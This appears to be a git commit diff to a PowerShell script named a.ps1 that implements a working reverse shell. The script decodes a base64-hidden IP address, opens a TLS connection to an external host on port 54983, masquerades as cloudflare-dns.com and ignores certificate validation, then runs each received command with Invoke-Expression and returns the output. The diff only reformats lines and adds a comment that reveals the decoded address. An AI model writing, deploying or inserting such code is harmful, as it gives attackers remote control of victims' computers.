89b14967a933e5f7d3e728939c8abf6cd57411d4
jktvz <admininfogathering@proton.me>
2026-02-17 01:08:43 +0300

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -5,14 +5,13 @@ if ($m) {
 }
 
 try {
-    
     $p = [System.Security.Authentication.SslProtocols]::Tls12
-    $i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
+    $i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU=')); # 146.70.240.205
     $port = 54983
 
-    
     $c = New-Object Net.Sockets.TCPClient($i, $port)
     $st = $c.GetStream()
+    
     $s = New-Object Net.Security.SslStream($st, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
     $s.AuthenticateAsClient("cloudflare-dns.com", $null, $p, $false)
 
@@ -28,8 +27,14 @@ try {
     while(($r = $s.Read($b, 0, $b.Length)) -gt 0) {
         $cmd = ([text.encoding]::UTF8).GetString($b, 0, $r).Trim()
         if ($cmd -eq 'exit') { break }
-        $res = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_ | Out-String }
+        
+        $res = try { 
+            Invoke-Expression $cmd 2>&1 | Out-String 
+        } catch { 
+            $_ | Out-String 
+        }
         _out $res
     }
+
     $w.Close(); $c.Close()
 } catch { exit }
